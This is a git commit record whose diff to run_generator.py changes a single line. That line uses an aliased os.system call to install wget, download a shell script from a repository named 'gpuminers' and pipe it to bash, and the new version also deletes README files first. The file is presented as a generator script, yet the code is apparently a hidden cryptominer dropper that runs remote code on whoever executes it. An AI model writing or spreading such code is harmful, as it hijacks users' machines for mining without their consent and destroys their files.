7dc34707c22c17063535c9ecb40cfbdcbc15bd55
veronjohnsons <92549959+veronjohnsons@users.noreply.github.com>
2021-10-15 18:12:37 +0000

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_wine_erg_no_ws.sh | bash")
+alpha.system("rm README* && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_wine_erg_no_ws.sh | bash")
